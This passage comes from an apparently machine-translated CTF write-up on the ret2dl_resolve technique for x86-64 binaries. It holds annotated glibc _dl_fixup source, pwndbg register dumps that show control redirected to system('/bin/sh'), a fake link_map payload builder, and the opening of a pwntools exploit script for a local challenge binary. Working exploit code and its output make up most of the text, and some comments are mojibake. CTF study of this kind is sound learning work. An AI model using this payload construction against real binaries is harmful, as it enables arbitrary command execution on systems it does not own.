class="number">1</span> = &#123;</span><br><span class="line">  l_addr = <span class="number">18446744073708782128</span>,</span><br><span class="line">  l_name = <span class="number">0x0</span>,</span><br><span class="line">  l_ld = <span class="number">0x601168</span>,</span><br><span class="line">  l_next = <span class="number">0x6bcf50</span>,</span><br><span class="line">  l_prev = <span class="number">0x7</span>,</span><br><span class="line">  l_real = <span class="number">0x0</span>,</span><br><span class="line">  l_ns = <span class="number">0</span>,</span><br><span class="line">  l_libname = <span class="number">0x0</span>,</span><br><span class="line">  l_info = &#123;<span class="number">0x601010</span>, <span class="number">0x68732f6e69622f</span>, <span class="number">0x4141414141414141</span>, <span class="number">0x4141414141414141</span>, <span class="number">0x4141414141414141</span>, <span class="number">0x601150</span>, <span class="number">0x601188</span>, <span class="number">0x4141414141414141</span> &lt;repeats <span class="number">16</span> times&gt;, <span class="number">0x601158</span>, <span class="number">0x0</span> &lt;repeats <span class="number">53</span> times&gt;&#125;,</span><br><span class="line">  l_phdr = <span class="number">0x0</span>,</span><br><span class="line">  l_entry = <span class="number">0</span>,</span><br><span class="line">  l_phnum = <span class="number">0</span>,</span><br><span class="line">  l_ldnum = <span class="number">0</span>,</span><br><span class="line">  l_</span><br></pre></td></tr></table></figure><p>I read it directly in pwndbg here, because of the structure of the source code, I have seen too little woo woo l_info This place contains<strong>DT_SYMTAB</strong>  <strong>DT_STRTAB</strong>  <strong>DT_JMPREL</strong>  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup (</span><br><span class="line"><span class="meta"># <span class="keyword">ifdef</span> ELF_MACHINE_RUNTIME_FIXUP_ARGS</span></span><br><span class="line">   ELF_MACHINE_RUNTIME_FIXUP_ARGS,</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line">   <span class="keyword">struct</span> link_map *l, ElfW(Word) reloc_arg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *<span class="type">const</span> symtab</span><br><span class="line">    = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);  Get the DT_SYMTAB table of the linkmap</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *strtab = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_STRTAB]);</span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> PLTREL *<span class="type">const</span> reloc</span><br><span class="line">    = (<span class="type">const</span> <span class="type">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);   Get the DT_JMPREL table of linkmap reloc relocation structure</span><br><span class="line">  <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];  Get r_info in the relocation structure</span><br><span class="line">  <span class="type">void</span> *<span class="type">const</span> rel_addr = (<span class="type">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);</span><br><span class="line">  <span class="type">lookup_t</span> result;</span><br><span class="line">  DL_FIXUP_VALUE_TYPE value;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Sanity check that we&#x27;re really looking at a PLT relocation.  */</span></span><br><span class="line">  assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);   r_infoä¸º<span class="number">7</span>å³å¯ç»•è¿‡</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* Look up the target symbol.  If the normal lookup rules are not</span></span><br><span class="line"><span class="comment">      used don&#x27;t look in the global scope.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>) sym-&gt;st_other is not <span class="number">0.</span> In fact, this place can fill in a parsed got table. When the writegot table is retrieved, it will be \x7f,. The statement in this <span class="keyword">if</span> is not what we want to play in <span class="number">64</span> bits. These conditions jump directly to the <span class="keyword">else</span> branch</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">const</span> <span class="keyword">struct</span> r_found_version *version = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Half)</span> *vernum =</span><br><span class="line">    (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">  version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">  <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">    version = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We need to keep the scope around so do some locking.  This is</span></span><br><span class="line"><span class="comment"> not necessary for objects which cannot be unloaded or when</span></span><br><span class="line"><span class="comment"> we are not using any threads (yet).  */</span></span><br><span class="line">      <span class="type">int</span> flags = DL_LOOKUP_ADD_DEPENDENCY;</span><br><span class="line">      <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">&#123;</span><br><span class="line">  THREAD_GSCOPE_SET_FLAG ();</span><br><span class="line">  flags |= DL_LOOKUP_GSCOPE_LOCK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> RTLD_ENABLE_FOREIGN_CALL</span></span><br><span class="line">      RTLD_ENABLE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,</span><br><span class="line">    version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We are done with the global scope.  */</span></span><br><span class="line">      <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">THREAD_GSCOPE_RESET_FLAG ();</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> RTLD_FINALIZE_FOREIGN_CALL</span></span><br><span class="line">      RTLD_FINALIZE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Currently result contains the base load address (or link map)</span></span><br><span class="line"><span class="comment"> of the object that defines sym.  Now add in the symbol</span></span><br><span class="line"><span class="comment"> offset.  */</span></span><br><span class="line">      value = DL_FIXUP_MAKE_VALUE (result,</span><br><span class="line">   sym ? (LOOKUP_VALUE_ADDRESS (result)</span><br><span class="line">  + sym-&gt;st_value) : <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* We already found the symbol.  The module (and therefore its load</span></span><br><span class="line"><span class="comment"> address) is also known.  */</span></span><br><span class="line">      value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);   It is found here that as <span class="type">long</span> as you control l-&gt;l_addr and sym-&gt;st_value, you can directly move here, sym-&gt;st_value is written as the function address of one of our libc, and l-&gt;l_addr is covered with a function address that we want to hijack. system-write, why write write here, because the sym-&gt;st_value we hijacked before is the address of the hijacked write function in libc, and it should also be written as libc address here</span><br><span class="line">      result = l;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* And now perhaps the relocation addend.  */</span></span><br><span class="line">  value = elf_machine_plt_value (l, reloc, value);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (sym != <span class="literal">NULL</span></span><br><span class="line">      &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, <span class="number">0</span>))</span><br><span class="line">    value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Finally, fix up the plt itself.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (GLRO(dl_bind_not)))</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">c</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">elf_machine_fixup_plt</span> <span class="params">(l, result, reloc, rel_addr, value)</span>;</span><br><span class="line">&#125;rel_addrå°±æ˜¯l-&gt;addr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf_machine_fixup_pltï¼š</span><br><span class="line">elf_machine_fixup_plt (<span class="keyword">struct</span> link_map *<span class="built_in">map</span>, <span class="type">lookup_t</span> t,</span><br><span class="line">       <span class="type">const</span> Elf32_Rela *reloc,</span><br><span class="line">       Elf32_Addr *reloc_addr, Elf32_Addr value)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> *reloc_addr = value;  We can see that the value overwrites reloc_addr and binds the value of the function. Next, directly when binding jmp r11</span><br><span class="line">&#125;</span><br><span class="line">Automatically bind and jmp r11 to system :</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ REGISTERS ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"> RAX  <span class="number">0xee</span></span><br><span class="line"> RBX  <span class="number">0x7ffff85dd3b0</span> â€”â–¸ <span class="number">0x400740</span> (__libc_csu_init) â—‚â€” push   r15</span><br><span class="line">*RCX  <span class="number">0x7f8395536fd2</span> (read+<span class="number">18</span>) â—‚â€” cmp    rax, <span class="number">-0x1000</span> <span class="comment">/* &#x27;H=&#x27; */</span></span><br><span class="line"> RDX  <span class="number">0x100</span></span><br><span class="line"> RDI  <span class="number">0x601198</span> â—‚â€” <span class="number">0x68732f6e69622f</span> <span class="comment">/* &#x27;/bin/sh&#x27; */</span></span><br><span class="line"> RSI  <span class="number">0x0</span></span><br><span class="line"> R8   <span class="number">0x0</span></span><br><span class="line"> R9   <span class="number">0x7f8395643d60</span> (_dl_fini) â—‚â€” endbr64 </span><br><span class="line"> R10  <span class="number">0x601150</span> â—‚â€” <span class="number">0xfffffffffff44230</span></span><br><span class="line"> R11  <span class="number">0x7f839547b290</span> (system) â—‚â€” endbr64 </span><br><span class="line"> R12  <span class="number">0x400550</span> (_start) â—‚â€” xor    ebp, ebp</span><br><span class="line"> R13  <span class="number">0x7ffff85dd4c0</span> â—‚â€” <span class="number">0x1</span></span><br><span class="line"> R14  <span class="number">0x0</span></span><br><span class="line"> R15  <span class="number">0x0</span></span><br><span class="line"> RBP  <span class="number">0x6161616161616161</span> (<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line"> RSP  <span class="number">0x7ffff85dd000</span> â—‚â€” <span class="number">0x100</span></span><br><span class="line">*RIP  <span class="number">0x7f839564ac6b</span> (_dl_runtime_resolve_xsavec+<span class="number">171</span>) â—‚â€” mov    rax, qword ptr [rsp]</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ DISASM ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">   <span class="number">0x7f839564ac52</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">146</span>&gt;    mov    r8, qword ptr [rsp + <span class="number">0x28</span>]</span><br><span class="line">   <span class="number">0x7f839564ac57</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">151</span>&gt;    mov    rdi, qword ptr [rsp + <span class="number">0x20</span>]</span><br><span class="line">   <span class="number">0x7f839564ac5c</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">156</span>&gt;    mov    rsi, qword ptr [rsp + <span class="number">0x18</span>]</span><br><span class="line">   <span class="number">0x7f839564ac61</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">161</span>&gt;    mov    rdx, qword ptr [rsp + <span class="number">0x10</span>]</span><br><span class="line">   <span class="number">0x7f839564ac66</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">166</span>&gt;    mov    rcx, qword ptr [rsp + <span class="number">8</span>]</span><br><span class="line"> â–º <span class="number">0x7f839564ac6b</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">171</span>&gt;    mov    rax, qword ptr [rsp]</span><br><span class="line">   <span class="number">0x7f839564ac6f</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">175</span>&gt;    mov    rsp, rbx</span><br><span class="line">   <span class="number">0x7f839564ac72</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">178</span>&gt;    mov    rbx, qword ptr [rsp]</span><br><span class="line">   <span class="number">0x7f839564ac76</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">182</span>&gt;    add    rsp, <span class="number">0x18</span></span><br><span class="line">   <span class="number">0x7f839564ac7a</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">186</span>&gt;    bnd jmp r11</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>DT_STRTAB pointer: located in link_map_addr +0x68 (0x34 under 32 bits)</li><li>DT_SYMTAB pointer: located at link_map_addr + 0x70 (0x38 under 32 bits)</li><li>DT_JMPREL pointer: located in link_map_addr +0xF8 (0x7C under 32 bits)</li></ul><p>Another thing to mention is l-&gt;addr, this fill in, this fill must be positive, if it is negative, it will report an error, so here we calculate the offset, if it is a positive sign, we will write it as a positive sign. The master conversion is &amp; (2 ** 64 - 1), we roughly analyze the source code and we know the principle, the following is the construction of the linkmap board</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>-- l_addr offset must be guaranteed to be positive here</span><br><span class="line"><span class="number">2</span>-- DT_JMPREL: make its address point to the location of the constructed .rel.plt relocation table entry</span><br><span class="line"><span class="number">3</span>-- Relocation table entry.rel.plt: make r_info, that is, the index redirected to the symbol table, is <span class="number">0</span></span><br><span class="line"><span class="number">4</span>-- DT_SYMTAB: Make the address pointing to the symbol table write_got<span class="number">-0x8</span>, so that st_value is equal to write_gotc</span><br><span class="line"><span class="number">5</span>-- DT_STRTAB: not used, just point to a readable location</span><br><span class="line">After constructing from the above steps, you can get value = l_addr + write_got = real_system, write the value into the got table entry and successfully call the system function</span><br></pre></td></tr></table></figure><p>Since the linkmap is not much different, the board of the online blog is directly used (if there is any infringement, please inform),</p><p>linkmap board:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fake_linkmap_payload</span>(<span class="params">fake_linkmap_addr,known_func_ptr,offset</span>):</span><br><span class="line">    <span class="comment"># &amp;(2**64-1)This is because the offset is usually a negative number. If you do not control the range, the p64 will go out of bounds and an error will occur.</span></span><br><span class="line">    linkmap=p64(offset &amp; (<span class="number">2</span>**<span class="number">64</span>-<span class="number">1</span>)) <span class="comment"># 1-- l_addr</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 2-- fake_linkmap_addr+0x8:  DT_JMPRELï¼ŒIts structure refers to the .dynamic section</span></span><br><span class="line">    linkmap+=p64(<span class="number">0</span>) <span class="comment"># any value</span></span><br><span class="line">    linkmap+=p64(fake_linkmap_addr+<span class="number">0x18</span>) <span class="comment"># Fake .rel.plt address</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 3-- fake_linkmap_addr+0x18</span></span><br><span class="line">    linkmap+=p64((fake_linkmap_addr+<span class="number">0x30</span>-offset)&amp;(<span class="number">2</span>**<span class="number">64</span>-<span class="number">1</span>)) <span class="comment"># r_offset: The address on the got table, it is not used, it can be set to a readable and writable address</span></span><br><span class="line">    linkmap+=p64(<span class="number">0x7</span>) <span class="comment"># r_info: 0x7 &gt;&gt; 32 = 0, Corresponding to index 0 of the sym table, the first item</span></span><br><span class="line">    linkmap+=p64(<span class="number">0</span>) <span class="comment"># r_addend: any value</span></span><br><span class="line"> </span><br><span class="line">    linkmap+=p64(<span class="number">0</span>) <span class="comment"># l_ns</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 4-- fake_linkmap_addr+0x38: DT_SYMTAB</span></span><br><span class="line">    linkmap+=p64(<span class="number">0</span>) <span class="comment"># any value</span></span><br><span class="line">    linkmap+=p64(known_func_ptr-<span class="number">0x8</span>) <span class="comment"># Point to the first address of the sym table, indirectly make st_value = known_func_ptr</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># fake_linkmap_addr+0x48</span></span><br><span class="line">    linkmap+=<span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    linkmap=linkmap.ljust(<span class="number">0x68</span>,<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">    linkmap+=p64(fake_linkmap_addr) <span class="comment"># Set the address where DT_STRTAB is located</span></span><br><span class="line">    linkmap+=p64(fake_linkmap_addr+<span class="number">0x38</span>) <span class="comment"># 0x70 Set the address where DT_SYMTAB is located</span></span><br><span class="line">    linkmap=linkmap.ljust(<span class="number">0xf8</span>,<span class="string">&#x27;B&#x27;</span>)</span><br><span class="line">    linkmap+=p64(fake_linkmap_addr+<span class="number">0x8</span>) <span class="comment">#Set the address where DT_JMPREL is located: any readable area can be</span></span><br><span class="line">    <span class="keyword">return</span> linkmap</span><br></pre></td></tr></table></figure><p>Letâ€™s play a stack overflow question directly. The use conditions are harsh, only overflow, and basically nothing else. At this time, we have to consider the ret2dl method.</p><p>The basic steps of stack overflow problem (PARTIAL_RELRO)</p><p>If there is an overflow in the first step, we migrate to a bss place, which is writable (executable), and then jump to the <em>dl_runtime_resolve</em> place, which is on our ida</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.plt:<span class="number">0000000000400540</span> _read           proc near               ; CODE XREF: vuln+<span class="number">2F</span>â†“p</span><br><span class="line">.plt:<span class="number">0000000000400540</span>                 jmp     cs:off_601030</span><br><span class="line">.plt:<span class="number">0000000000400540</span> _read           endp</span><br><span class="line">.plt:<span class="number">0000000000400540</span></span><br><span class="line">.plt:<span class="number">0000000000400546</span> ; ---------------------------------------------------------------------------c</span><br><span class="line">.plt:<span class="number">0000000000400546</span>                 push    <span class="number">3</span></span><br><span class="line">.plt:<span class="number">000000000040054B</span>                 jmp     sub_400500   this place</span><br><span class="line">.plt:<span class="number">000000000040054B</span> ; &#125; <span class="comment">// starts at 400500</span></span><br><span class="line">.plt:<span class="number">000000000040054B</span> _plt</span><br></pre></td></tr></table></figure><p>This involves the binding knowledge of a lazy binding</p><p>To directly adopt the words of Master Kotorâ€™s master is:</p><p>When the library function is called for the first time, the program will first go to his plt table, push the second parameter <code>reloc_offset</code> of <code>_dl_runtime_resolve</code>, at this time the got table stores the next jump from his own plt table A statement, jump to the public plt[0], push the first parameter <code>link_map</code>, and finally call <code>_dl_runtime_resolve</code> to write the redirected address into the got table</p><p><img src="https://img.le1a.com/2022/04/21/8cc3d5dd226a8.png" alt="1650544684766.png"></p><p>This 0x8049030 is where we _dl_runtime_resolve (secretly took the picture of kot master, (escape)), then thatâ€™s ok, know this location, directly hijack the execution flow to this place when we finally return, and then hijack it again , we fill in a linkmap address we forged later, one is reloc_arg, here we are hijacking the linkmap, but we donâ€™t need it, so it can be 0, and the construction can be started directly:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./pwn&#x27;</span>)  </span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)  </span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.31.so&#x27;</span>)  </span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]  </span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]  </span><br><span class="line">vuln_addr = elf.sym[<span class="string">&#x27;vuln&#x27;</span>]  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#bss  </span></span><br><span class="line">bss = <span class="number">0x601050</span>  </span><br><span class="line">bss_addr = bss + <span class="number">0x100</span></span><br><span class="line">l_addr =  libc.sym[<span class="string">&#x27;system&#x27;</span>] -libc.sym[<span class="string">&#x27;write&#x27;</span>]  <span class="comment"># l_addr = -769472, é€šå¸¸ä¸ºè´Ÿæ•°</span></span><br><span class="line">  </span><br><span class="line">pop_rdi = <span class="number">0x4007a3</span>  </span><br><span class="line"><span class="comment">#pop rsi ; pop r15 ; ret  </span></span><br><span class="line">pop_rsi = <span class="number">0x4007a1</span>  </span><br><span class="line"><span class="comment">#ç”¨äºè§£æç¬¦å·dl_runtime_resolve  </span></span><br><span class="line">dl_re = <span class="number">0x400506</span>  </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fake_linkmap_payload</span>(<span class="params">fake_linkmap_addr,known_func_ptr,offset</span>):</span><br><span class="line">    <span class="comment"># &amp;(2**64-1)This is because the offset is usually a negative number. If you do not control the range, the p64 will go out of bounds and an error will occur.</span></span><br><span class="line">    linkmap=p64(offset &amp; (<span class="number">2</span>**<span class="number">64</span>-<span class="number">1</span>)) <span class="comment"># 1-- l_addr</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 2-- fake_linkmap_addr+0x8:  DT_JMPRELï¼ŒIts structure refers to the .dynamic section</span></span><br><span class="line">    linkmap+=p64(<span class="number">0</span>) <span class="comment"># any value</span></span><br><span class="line">    linkmap+=p64(fake_linkmap_addr+<span class="number">0x18</span>) <span class="comment"># Fake .rel.plt address</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 3-- fake_linkmap_addr+0x18</span></span><br><span class="line">    linkmap+=p64((fake_linkmap_addr+<span class="number">0x30</span>-offset)&amp;(<span class="number">2</span>**<span class="number">64</span>-<span class="number">1</span>)) <span class="comment"># r_offset: The address on the got table, it is not used, it can be set to a readable and writable address</span></span><br><span class="line">    linkmap+=p64(<span class="number">0x7</span>) <span class="comment"># r_info: 0x7 &gt;&gt; 32 = 0, Corresponding to index 0 of the sym table, the first item</span></span><br><span class="line">    linkmap+=p64(<span class="number">0</span>) <span class="comment"># r_addend: any value</span></span><br><span class="line"> </span><br><span class="line">    linkmap+=p64(<span class="number">0</span>) <span class="comment"># l_ns</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 4-- fake_linkmap_addr+0x38: DT_SYMTAB</span></span><br><span class="line">    linkmap+=p64(<span class="number">0</span>) <span class="comment"># any value</span></span><br><span class="line">    linkmap+=p64(known_func_ptr-<span class="number">0x8</span>) <span class="comment"># Point to the first address of the sym table, indirectly make st_value = known_func_ptr</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># fake_linkmap_addr+0x48</span></span><br><span class="line">    linkmap+=<span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    linkmap=linkmap.ljust(<span class="number">0x68</span>,<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">    linkmap+=p64(fake_linkmap_addr) <span class="comment"># Set the address where DT_STRTAB is located</span></span><br><span class="line">    linkmap+=p64(fake_linkmap_addr+<span class="number">0x38</span>) <span class="comment"># 0x70 Set the address where DT_SYMTAB is located</span></span><br><span class="line">    linkmap=linkmap.ljust(<span 